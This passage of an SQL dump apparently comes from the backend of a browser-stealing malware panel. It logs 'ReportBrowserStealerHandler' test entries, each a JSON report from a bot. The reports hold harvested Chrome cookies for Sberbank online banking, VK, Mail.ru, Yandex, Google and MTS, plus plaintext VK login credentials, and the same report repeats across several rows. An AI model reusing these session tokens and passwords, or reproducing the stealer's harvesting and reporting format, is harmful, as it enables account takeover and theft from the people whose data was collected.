AHWqTUlFl8H6nLr1YJTneab1MQydXq5kyf95j17OZWTUGxJVTD2Pw4EjaTcgLfuy\", \".sberbank.ru 0 / 0 13238107521000000 _ym_isad 2\", \".google.com 1 / 1 13253857131754810 NID 204=L24jdZirgSVCxsOBhu0z_GnWjJFCjWh-tYVFp5p2biZ_EJUbNUQRuy-5PjNUNMPthuEfM7j3RebznWBZlEjn6FElBfTgHTrcc_Fk_vW3Igh4orSWNHdve2MmUgIOFVplnDXRaNNN7nuGASjGvPmHGLPqAP8vFx99vmKQsgdZJaY\", \"scr.online.sberbank.ru 0 / 1 13269582547652961 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN//ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK/I=\", \".rutarget.ru 0 / 1 13253598553637300 userId YUuuZzJ8rIIZ\", \".sberbank.ru 0 / 0 13238048932000000 _gat 1\", \".sberbank.ru 0 / 0 13238048932000000 _gat_ua211694381 1\", \"online.sberbank.ru 0 / 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\", \"online.sberbank.ru 0 / 0 0 TS012cf864 013ade28994a7ab8e3f49518ac3d95c725ffe615f1841c5b2f6ffa1d23771b82e63095d318d637d2530e05f15efe5256bae25fccde\", \"online.sberbank.ru 0 / 0 0 TS012cf864001 01b44903ab063b370a214fc804214aee3409967734fae066cc14fc2f582f82bd623ba36d8a1706b76da78bc13aec8166b2df4fbad9\", \".sberbank.ru 0 / 0 13269584884000000 __zzat2 MDA0dBA=Fz2+aQ==\", \".sberbank.ru 0 / 0 13301120883000000 _ga GA1.2.577123051.1591556353\", \".sberbank.ru 0 / 0 13238135283000000 _gid GA1.2.2030719841.1593561921\", \".sberbank.ru 0 / 0 13269584884000000 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN//ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK/I=\"],\n			\"accounts\":	[{\n					\"service\":	\"https://login.vk.com/\",\n					\"login\":	\"putin\",\n					\"password\":	\"vvp_228\"\n				}, {\n					\"service\":	\"https://login.vk.com/\",\n					\"login\":	\"putin\",\n					\"password\":	\"vvp_228\"\n				}]\n		}]\n}', '2020-07-01 12:45:12'),
(11, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST START)', '02553B5FF1C837559555', '2020-07-01 12:47:34'),
(12, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST)', '{\"browsers\":[{\"browser\":\"Google Chrome\",\"cookies\":[\".vk.com 0 \\/ 1 13265784623000000 remixdt -36000\",\".vk.com 0 \\/ 1 13266287803882178 remixlang 1\",\".vk.com 0 \\/ 1 13266719218882446 remixlhk ec031cee8f3fd2ba5b\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_depth 24\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_dpr 1\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_height 975\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_width 1920\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_winzoom 1\",\".vk.com 0 \\/ 0 13263019827000000 tmr_lvid f8a3729c9802b290f83a1a16c1c43f49\",\".vk.com 0 \\/ 0 13263019827000000 tmr_lvidTS 1589775027709\",\".vk.com 0 \\/ 0 13263019827000000 tmr_reqNum 1\",\".yadro.ru 0 \\/ 0 13266313195579910 FTID 1UoS712MBwvx1UoS710011Av\",\".mail.ru 1 \\/ 1 13266412648086679 VID 0GO-Qb155DHx00000R0sD4Hx:::0-0-0-3dbd6d4:CAASEC0lbC3k8X_DD93TO6MKe80aYM_t79-Uw4qfUdDn-1jt241K9OxkEpf4gE8vHkftNgYrXLwbs0PxpTCCMTxctb9F97Njof2lDM-SrPP5ndCtczSDLPsruF2SFUO1LTVdO8T_8wjdu1cYxpUAiTBETAkRfQ\",\".yadro.ru 0 \\/ 0 13266313194879445 VID 2Xi0OU0bqHvx1UoS720011DM\",\".mail.ru 0 \\/ 0 13297826242000000 __gads ID=cddb04f0f6e01b41:T=1590280642:S=ALNI_MZtJtgtUvK5CBAk0mVAcX3ZcDSzOA\",\".amazon-adsystem.com 1 \\/ 1 13253971042869173 ad-id A4MqzezoNku-ua20_Egp7Mo\",\".amazon-adsystem.com 1 \\/ 1 13395839842869225 ad-privacy 0\",\".mail.ru 0 \\/ 1 13266326248507520 b 5UcGAJAQNgUAqxUghNU7e8P2nb0hOM3R8BWqYQgAACCc1+CKwokK+CYA\",\".mail.ru 0 \\/ 1 13266326235164790 c wMHJXgEAAHsTAAAUAAAACQAQ\",\".tns-counter.ru 0 \\/ 1 13266326236646311 guid C8CF730A5EC17E14X1589739028\",\".mail.ru 0 \\/ 1 13250342248507571 i AQC\\/wcleAQBdBgUCAQA=\",\".openx.net 0 \\/ 1 13266326232613361 i 707b88d4-ab27-0c1f-344d-fa3992c6cffc|1590280637\",\".mail.ru 1 \\/ 1 13550150232764845 mrcu 2AD35EC9C1BD75DC94101265DCB9\",\".mail.ru 0 \\/ 0 13266326243244857 o :233:AA==.s\",\".mail.ru 0 \\/ 1 13297862234858562 p 0W8AAB2qQgAA\",\".mail.ru 0 \\/ 1 13266326249000000 s ww=937|wh=831|fver=0\",\".mail.ru 0 \\/ 1 13550150236879821 searchuid 7840494581590280641\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_lvid 0d6a9a0a647e910dd555eadb28c7a52b\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_lvidTS 1590316636735\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_reqNum 6\",\".sberbank.ru 0 \\/ 0 13267565955000000 _ym_d 1591556355\",\".sberbank.ru 0 \\/ 0 13267565955000000 _ym_uid 1591556355852459708\",\".yandex.ru 1 \\/ 1 13551389959073993 i v5Ss2eajRohYpm9Tifeul0ICbyYaF7dE5PSIJ6G+LOb58YDyS\\/TCY1S59El2Pt9AE9OHAq7vevOqCYIugBWaOJi1lPM=\",\".yandex.ru 0 \\/ 1 13551389960212104 yandexuid 7840494581590280641\",\".yandex.ru 0 \\/ 1 13267565960212176 ymex 1906916364.yrts.1591556364#1906916361.yrtsi.1591556361\",\".yandex.ru 0 \\/ 1 13551389960212152 yuidss 7840494581590280641\",\".google.com 1 \\/complete\\/search 0 13251685809056841 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\",\".google.com 1 \\/search 0 13251685809056865 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\",\".google.com.ua 1 \\/ 1 13251945014319897 NID 204=0Typ66Bqrjt7liEZ6E-jx-pZR5-6C2YCoMR3wfY4V66JAc8ZkUxceZW6oTp1zilmbghoIssr6wxS124L1Ye13rq0bLu_cbUE1rCiDtrwqUfPxWGrERcUBA5NelZArXAmK-2-NHgD-Vk89hnWnBou95cL0h13BkcU9HPeKDwMXOM\",\"www.sberbank.ru 0 \\/ 1 13267669552901736 BBTracking MjA=\",\".sberbank.ru 0 \\/ 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\",\"www.sberbank.ru 0 \\/ 1 13266891952901717 anonymousUserId 315ac997-00b3-4444-9e76-126b589d20be\",\".sberbank.ru 0 \\/ 0 13243909925000000 _fbp fb.1.1591660325358.22249772\",\".facebook.com 1 \\/ 1 13243909928725015 fr 04ygV2GsEiFlSKWee..Be3s9f...1.0.Be3s9f.\",\".sberbank.ru 0 \\/ 0 13322533925000000 last_visit 1591635125258::1591660325258\",\".mts.ru 0 \\/ 0 13547173918339991 mts_id 86e1fb4b-d892-4bff-b655-bec3bb9eff1a\",\".mts.ru 0 \\/ 0 13547173918340027 mts_id_last_sync 1591660372\",\".rambler.ru 0 \\/ 0 13790390100892620 proto_uid 1CIAAGLP3l4iKrhbAWqf7wB=\",\".rambler.ru 0 \\/ 1 13790390100892582 ruid 1CIAAGLP3l4iKrhbAWqf7wB=\",\".sberbank.ru 0 \\/ 0 13322533925000000 top100_id t1.3122244.1756656542.1591660325255\",\".google.com 0 \\/ 0 13790390403592833 CONSENT WP.2879ae.28844e\",\".google.com 1 \\/verify 1 13253575684317923 SNID APx-0P06Ib2DBKJU_9ylnhwHShtylZmmIJZVaoDGz_Hm33U8f2x8zCfaeedGbgSH6cVN3dNripy8g6R-ClXT\",\".google.com 0 \\/ 1 13240365670000000 1P_JAR 2020-6-27-23\",\".google.com 1 \\/ 1 13299205256720333 ANID AHWqTUlU6Sz5uCLL-R_WYZeAHi34xyYYYkdQxvm-qZ0LUnm3rFCzZX90jjr0Y78w\",\".doubleclick.net 1 \\/ 1 13268450244177232 IDE AHWqTUlFl8H6nLr1YJTneab1MQydXq5kyf95j17OZWTUGxJVTD2Pw4EjaTcgLfuy\",\".sberbank.ru 0 \\/ 0 13238107521000000 _ym_isad 2\",\".google.com 1 \\/ 1 13253857131754810 NID 204=L24jdZirgSVCxsOBhu0z_GnWjJFCjWh-tYVFp5p2biZ_EJUbNUQRuy-5PjNUNMPthuEfM7j3RebznWBZlEjn6FElBfTgHTrcc_Fk_vW3Igh4orSWNHdve2MmUgIOFVplnDXRaNNN7nuGASjGvPmHGLPqAP8vFx99vmKQsgdZJaY\",\"scr.online.sberbank.ru 0 \\/ 1 13269582547652961 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN\\/\\/ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK\\/I=\",\".rutarget.ru 0 \\/ 1 13253598553637300 userId YUuuZzJ8rIIZ\",\".sberbank.ru 0 \\/ 0 13238048932000000 _gat 1\",\".sberbank.ru 0 \\/ 0 13238048932000000 _gat_ua211694381 1\",\"online.sberbank.ru 0 \\/ 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\",\"online.sberbank.ru 0 \\/ 0 0 TS012cf864 013ade28994a7ab8e3f49518ac3d95c725ffe615f1841c5b2f6ffa1d23771b82e63095d318d637d2530e05f15efe5256bae25fccde\",\"online.sberbank.ru 0 \\/ 0 0 TS012cf864001 01b44903ab063b370a214fc804214aee3409967734fae066cc14fc2f582f82bd623ba36d8a1706b76da78bc13aec8166b2df4fbad9\",\".sberbank.ru 0 \\/ 0 13269584884000000 __zzat2 MDA0dBA=Fz2+aQ==\",\".sberbank.ru 0 \\/ 0 13301120883000000 _ga GA1.2.577123051.1591556353\",\".sberbank.ru 0 \\/ 0 13238135283000000 _gid GA1.2.2030719841.1593561921\",\".sberbank.ru 0 \\/ 0 13269584884000000 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN\\/\\/ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK\\/I=\"],\"accounts\":[{\"service\":\"https:\\/\\/login.vk.com\\/\",\"login\":\"putin\",\"password\":\"vvp_228\"},{\"service\":\"https:\\/\\/login.vk.com\\/\",\"login\":\"putin\",\"password\":\"vvp_228\"}]}],\"bot_id\":\"6\"}', '2020-07-01 13:08:07'),
(13, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST)', '{\"browsers\":[{\"browser\":\"Google Chrome\",\"cookies\":[\".vk.com 0 \\/ 1 13265784623000000 remixdt -36000\",\".vk.com 0 \\/ 1 13266287803882178 remixlang 1\",\".vk.com 0 \\/ 1 13266719218882446 remixlhk ec031cee8f3fd2ba5b\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_depth 24\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_dpr 1\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_height 975\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_width 1920\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_winzoom 1\",\".vk.com 0 \\/ 0 13263019827000000 tmr_lvid f8a3729c9802b290f83a1a16c1c43f49\",\".vk.com 0 \\/ 0 13263019827000000 tmr_lvidTS 1589775027709\",\".vk.com 0 \\/ 0 13263019827000000 tmr_reqNum 1\",\".yadro.ru 0 \\/ 0 13266313195579910 FTID 1UoS712MBwvx1UoS710011Av\",\".mail.ru 1 \\/ 1 13266412648086679 VID 0GO-Qb155DHx00000R0sD4Hx:::0-0-0-3dbd6d4:CAASEC0lbC3k8X_DD93TO6MKe80aYM_t79-Uw4qfUdDn-1jt241K9OxkEpf4gE8vHkftNgYrXLwbs0PxpTCCMTxctb9F97Njof2lDM-SrPP5ndCtczSDLPsruF2SFUO1LTVdO8T_8wjdu1cYxpUAiTBETAkRfQ\",\".yadro.ru 0 \\/ 0 13266313194879445 VID 2Xi0OU0bqHvx1UoS720011DM\",\".mail.ru 0 \\/ 0 13297826242000000 __gads ID=cddb04f0f6e01b41:T=1590280642:S=ALNI_MZtJtgtUvK5CBAk0mVAcX3ZcDSzOA\",\".amazon-adsystem.com 1 \\/ 1 13253971042869173 ad-id A4MqzezoNku-ua20_Egp7Mo\",\".amazon-adsystem.com 1 \\/ 1 13395839842869225 ad-privacy 0\",\".mail.ru 0 \\/ 1 13266326248507520 b 5UcGAJAQNgUAqxUghNU7e8P2nb0hOM3R8BWqYQgAACCc1+CKwokK+CYA\",\".mail.ru 0 \\/ 1 13266326235164790 c wMHJXgEAAHsTAAAUAAAACQAQ\",\".tns-counter.ru 0 \\/ 1 13266326236646311 guid C8CF730A5EC17E14X1589739028\",\".mail.ru 0 \\/ 1 13250342248507571 i AQC\\/wcleAQBdBgUCAQA=\",\".openx.net 0 \\/ 1 13266326232613361 i 707b88d4-ab27-0c1f-344d-fa3992c6cffc|1590280637\",\".mail.ru 1 \\/ 1 13550150232764845 mrcu 2AD35EC9C1BD75DC94101265DCB9\",\".mail.ru 0 \\/ 0 13266326243244857 o :233:AA==.s\",\".mail.ru 0 \\/ 1 13297862234858562 p 0W8AAB2qQgAA\",\".mail.ru 0 \\/ 1 13266326249000000 s ww=937|wh=831|fver=0\",\".mail.ru 0 \\/ 1 13550150236879821 searchuid 7840494581590280641\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_lvid 0d6a9a0a647e910dd555eadb28c7a52b\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_lvidTS 1590316636735\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_reqNum 6\",\".sberbank.ru 0 \\/ 0 13267565955000000 _ym_d 1591556355\",\".sberbank.ru 0 \\/ 0 13267565955000000 _ym_uid 1591556355852459708\",\".yandex.ru 1 \\/ 1 13551389959073993 i v5Ss2eajRohYpm9Tifeul0ICbyYaF7dE5PSIJ6G+LOb58YDyS\\/TCY1S59El2Pt9AE9OHAq7vevOqCYIugBWaOJi1lPM=\",\".yandex.ru 0 \\/ 1 13551389960212104 yandexuid 7840494581590280641\",\".yandex.ru 0 \\/ 1 13267565960212176 ymex 1906916364.yrts.1591556364#1906916361.yrtsi.1591556361\",\".yandex.ru 0 \\/ 1 13551389960212152 yuidss 7840494581590280641\",\".google.com 1 \\/complete\\/search 0 13251685809056841 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\",\".google.com 1 \\/search 0 13251685809056865 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\",\".google.com.ua 1 \\/ 1 13251945014319897 NID 204=0Typ66Bqrjt7liEZ6E-jx-pZR5-6C2YCoMR3wfY4V66JAc8ZkUxceZW6oTp1zilmbghoIssr6wxS124L1Ye13rq0bLu_cbUE1rCiDtrwqUfPxWGrERcUBA5NelZArXAmK-2-NHgD-Vk89hnWnBou95cL0h13BkcU9HPeKDwMXOM\",\"www.sberbank.ru 0 \\/ 1 13267669552901736 BBTracking MjA=\",\".sberbank.ru 0 \\/ 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\",\"www.sberbank.ru 0 \\/ 1 13266891952901717 anonymousUserId 315ac997-00b3-4444-9e76-126b589d20be\",\".sberbank.ru 0 \\/ 0 13243909925000000 _fbp fb.1.1591660325358.22249772\",\".facebook.com 1 \\/ 1 13243909928725015 fr 04ygV2GsEiFlSKWee..Be3s9f...1.0.Be3s9f.\",\".sberbank.ru 0 \\/ 0 13322533925000000 last_visit 1591635125258::1591660325258\",\".mts.ru 0 \\/ 0 13547173918339991 mts_id 86e1fb4b-d892-4bff-b655-bec3bb9eff1a\",\".mts.ru 0 \\/ 0 13547173918340027 mts_id_last_sync 1591660372\",\".rambler.ru 0 \\/ 0 13790390100892620 proto_uid 1CIAAGLP3l4iKrhbAWqf7wB=\",\".rambler.ru 0 \\/ 1 13790390100892582 ruid 1CIAAGLP3l4iKrhbAWqf7wB=\",\".sberbank.ru 0 \\/ 0 13322533925000000 top100_id t1.3122244.1756656542.1591660325255\",\".google.com 0 \\/ 0 13790390403592833 CONSENT WP.2879ae.28844e\",\".google.com 1 \\/verify 1 13253575684317923 SNID APx-0P06Ib2DBKJU_9ylnhwHShtylZmmIJZVaoDGz_Hm33U8f2x8zCfaeedGbgSH6cVN3dNripy8g6R-ClXT\",\".google.com 0 \\/ 1 13240365670000000 1P_JAR 2020-6-27-23\",\".google.com 1 \\/ 1 13299205256720333 ANID AHWqTUlU6Sz5uCLL-R_WYZeAHi34xyYYYkdQxvm-qZ0LUnm3rFCzZX90jjr0Y78w\",\".doubleclick.net 1 \\/ 1 13268450244177232 IDE AHWqTUlFl8H6nLr1YJTneab1MQydXq5kyf95j17OZWTUGxJVTD2Pw4EjaTcgLfuy\",\".sberbank.ru 0 \\/ 0 13238107521000000 _ym_isad 2\",\".google.com 1 \\/ 1 13253857131754810 NID 204=L24jdZirgSVCxsOBhu0z_GnWjJFCjWh-tYVFp5p2biZ_EJUbNUQRuy-5PjNUNMPthuEfM7j3RebznWBZlEjn6FElBfTgHTrcc_Fk_vW3Igh4orSWNHdve2MmUgIOFVplnDXRaNNN7nuGASjGvPmHGLPqAP8vFx99vmKQsgdZJaY\",\"scr.online.sberbank.ru 0 \\/ 1 13269582547652961 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN\\/\\/ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK\\/I=\",\".rutarget.ru 0 \\/ 1 13253598553637300 userId YUuuZzJ8rIIZ\",\".sberbank.ru 0 \\/ 0 13238048932000000 _gat 1\",\".sberbank.ru 0 \\/ 0 13238048932000000 _gat_ua211694381 1\",\"online.sberbank.ru 0 \\/ 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\",\"online.sberbank.ru 0 \\/ 0 0 TS012cf864 013ade28994a7ab8e3f49518ac3d95c725ffe615f1841c5b2f6ffa1d23771b82e63095d318d637d2530e05f15efe5256bae25fccde\",\"online.sberbank.ru 0 \\/ 0 0 TS012cf864001 01b44903ab063b370a214fc804214aee3409967734fae066cc14fc2f582f82bd623ba36d8a1706b76da78bc13aec8166b2df4fbad9\",\".sberbank.ru 0 \\/ 0 13269584884000000 __zzat2 MDA0dBA=Fz2+aQ==\",\".sberbank.ru 0 \\/ 0 13301120883000000 _ga GA1.2.577123051.1591556353\",\".sberbank.ru 0 \\/ 0 13238135283000000 _gid GA1.2.2030719841.1593561921\",\".sberbank.ru 0 \\/ 0 13269584884000000 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN\\/\\/ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK\\/I=\"],\"accounts\":[{\"service\":\"https:\\/\\/login.vk.com\\/\",\"login\":\"putin\",\"password\":\"vvp_228\"},{\"service\":\"https:\\/\\/login.vk.com\\/\",\"login\":\"putin\",\"password\":\"vvp_228\"}]}],\"bot_id\":\"6\"}', '2020-07-01 13:08:07'),
(14, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST)', '{\"browsers\":[{\"browser\":\"Google Chrome\",\"cookies\":[\".vk.com 0 \\/ 1 13265784623000000 remixdt -36000\",\".vk.com 0 \\/ 1 13266287803882178 remixlang 1\",\".vk.com 0 \\/ 1 13266719218882446 remixlhk ec031cee8f3fd2ba5b\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_depth 24\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_dpr 1\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_height 975\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_width 1920\",\".vk.com 0 \\/ 1 13265784623000000 remixscreen_winzoom 1\",\".vk.com 0 \\/ 0 13263019827000000 tmr_lvid f8a3729c9802b290f83a1a16c1c43f49\",\".vk.com 0 \\/ 0 13263019827000000 tmr_lvidTS 1589775027709\",\".vk.com 0 \\/ 0 13263019827000000 tmr_reqNum 1\",\".yadro.ru 0 \\/ 0 13266313195579910 FTID 1UoS712MBwvx1UoS710011Av\",\".mail.ru 1 \\/ 1 13266412648086679 VID 0GO-Qb155DHx00000R0sD4Hx:::0-0-0-3dbd6d4:CAASEC0lbC3k8X_DD93TO6MKe80aYM_t79-Uw4qfUdDn-1jt241K9OxkEpf4gE8vHkftNgYrXLwbs0PxpTCCMTxctb9F97Njof2lDM-SrPP5ndCtczSDLPsruF2SFUO1LTVdO8T_8wjdu1cYxpUAiTBETAkRfQ\",\".yadro.ru 0 \\/ 0 13266313194879445 VID 2Xi0OU0bqHvx1UoS720011DM\",\".mail.ru 0 \\/ 0 13297826242000000 __gads ID=cddb04f0f6e01b41:T=1590280642:S=ALNI_MZtJtgtUvK5CBAk0mVAcX3ZcDSzOA\",\".amazon-adsystem.com 1 \\/ 1 13253971042869173 ad-id A4MqzezoNku-ua20_Egp7Mo\",\".amazon-adsystem.com 1 \\/ 1 13395839842869225 ad-privacy 0\",\".mail.ru 0 \\/ 1 13266326248507520 b 5UcGAJAQNgUAqxUghNU7e8P2nb0hOM3R8BWqYQgAACCc1+CKwokK+CYA\",\".mail.ru 0 \\/ 1 13266326235164790 c wMHJXgEAAHsTAAAUAAAACQAQ\",\".tns-counter.ru 0 \\/ 1 13266326236646311 guid C8CF730A5EC17E14X1589739028\",\".mail.ru 0 \\/ 1 13250342248507571 i AQC\\/wcleAQBdBgUCAQA=\",\".openx.net 0 \\/ 1 13266326232613361 i 707b88d4-ab27-0c1f-344d-fa3992c6cffc|1590280637\",\".mail.ru 1 \\/ 1 13550150232764845 mrcu 2AD35EC9C1BD75DC94101265DCB9\",\".mail.ru 0 \\/ 0 13266326243244857 o :233:AA==.s\",\".mail.ru 0 \\/ 1 13297862234858562 p 0W8AAB2qQgAA\",\".mail.ru 0 \\/ 1 13266326249000000 s ww=937|wh=831|fver=0\",\".mail.ru 0 \\/ 1 13550150236879821 searchuid 7840494581590280641\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_lvid 0d6a9a0a647e910dd555eadb28c7a52b\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_lvidTS 1590316636735\",\".mail.ru 0 \\/ 0 13263561448000000 tmr_reqNum 6\",\".sberbank.ru 0 \\/ 0 13267565955000000 _ym_d 1591556355\",\".sberbank.ru 0 \\/ 0 13267565955000000 _ym_uid 1591556355852459708\",\".yandex.ru 1 \\/ 1 13551389959073993 i v5Ss2eajRohYpm9Tifeul0ICbyYaF7dE5PSIJ6G+LOb58YDyS\\/TCY1S59El2Pt9AE9OHAq7vevOqCYIugBWaOJi1lPM=\",\".yandex.ru 0 \\/ 1 13551389960212104 yandexuid 7840494581590280641\",\".yandex.ru 0 \\/ 1 13267565960212176 ymex 1906916364.yrts.1591556364#1906916361.yrtsi.1591556361\",\".yandex.ru 0 \\/ 1 13551389960212152 yuidss 7840494581590280641\",\".google.com 1 \\/complete\\/search 0 13251685809056841 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\",\".google.com 1 \\/search 0 13251685809056865 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\",\".google.com.ua 1 \\/ 1 13251945014319897 NID 204=0Typ66Bqrjt7liEZ6E-jx-pZR5-6C2YCoMR3wfY4V66JAc8ZkUxceZW6oTp1zilmbghoIssr6wxS124L1Ye13rq0bLu_cbUE1rCiDtrwqUfPxWGrERcUBA5NelZArXAmK-2-NHgD-Vk89hnWnBou95cL0h13BkcU9HPeKDwMXOM\",\"www.sberbank.ru 0 \\/ 1 13267669552901736 BBTracking MjA=\",\".sberbank.ru 0 \\/ 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\",\"www.sberbank.ru 0 \\/ 1 13266891952901717 anonymousUserId 315ac997-00b3-4444-9e76-126b589d20be\",\".sberbank.ru 0 \\/ 0 13243909925000000 _fbp fb.1.1591660325358.22249772\",\".facebook.com 1 \\/ 1 13243909928725015 fr 04ygV2GsEiFlSKWee..Be3s9f...1.0.Be3s9f.\",\".sberbank.ru 0 \\/ 0 13322533925000000 last_visit 1591635125258::1591660325258\",\".mts.ru 0 \\/ 0 13547173918339991 mts_id 86e1fb4b-d892-4bff-b655-bec3bb9eff1a\",\".mts.ru 0 \\/ 0 13547173918340027 mts_id_last_sync 1591660372\",\".rambler.ru 0 \\/ 0 13790390100892620 proto_uid 1CIAAGLP3l4iKrhbAWqf7wB=\",\".rambler.ru 0 \\/ 1 13790390100892582 ruid 1CIAAGLP3l4iKrhbAWqf7wB=\",\".sberbank.ru 0 \\/ 0 13322533925000000 top100_id t1.3122244.1756656542.1591660325255\",\".google.com 0 \\/ 0 13790390403592833 CONSENT WP.2879ae.28844e\",\".google.com 1 \\/verify 1 13253575684317923 SNID APx-0P06Ib2DBKJU_9ylnhwHShtylZmmIJZVaoDGz_Hm33U8f2x8zCfaeedGbgSH6cVN3dNripy8g6R-ClXT\",\".google.com 0 \\/ 1 13240365670000000 1P_JAR 2020-6-27-23\",\".google.com 1 \\/ 1 13299205256720333 ANID AHWqTUlU6Sz5uCLL-R_WYZeAHi34xyYYYkdQxvm-qZ0LUnm3rFCzZX90jjr0Y78w\",\".doubleclick.net 1 \\/ 1 13268450244177232 IDE AHWqTUlFl8H6nLr1YJTneab1MQydXq5kyf95j17OZWTUGxJVTD2Pw4EjaTcgLfuy\",\".sberbank.ru 0 \\/ 0 13238107521000000 _ym_isad 2\",\".google.com 1 \\/ 1 13253857131754810 NID 204=L24jdZirgSVCxsOBhu0z_GnWjJFCjWh-tYVFp5p2biZ_EJUbNUQRuy-5PjNUNMPthuEfM7j3RebznWBZlEjn6FElBfTgHTrcc_Fk_vW3Igh4orSWNHdve2MmUgIOFVplnDXRaNNN7nuGASjGvPmHGLPqAP8vFx99vmKQsgdZJaY\",\"scr.online.sberbank.ru 0 \\/ 1 13269582547652961 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN\\/\\/ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK\\/I=\",\".rutarget.ru 0 \\/ 1 13253598553637300 userId YUuuZzJ8rIIZ\",\".sberbank.ru 0 \\/ 0 13238048932000000 _gat 1\",\".sberbank.ru 0 \\/ 0 13238048932000000 _gat_ua211694381 1\",\"online.sberbank.ru 0 \\/ 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\",\"online.sberbank.ru 0 \\/ 0 0 TS012cf864 013ade28994a7ab8e3f49518ac3d95c725ffe615f1841c5b2f6ffa1d23771b82e63095d318d637d2530e05f15efe5256bae25fccde\",\"online.sberbank.ru 0 \\/ 0 0 TS012cf864001 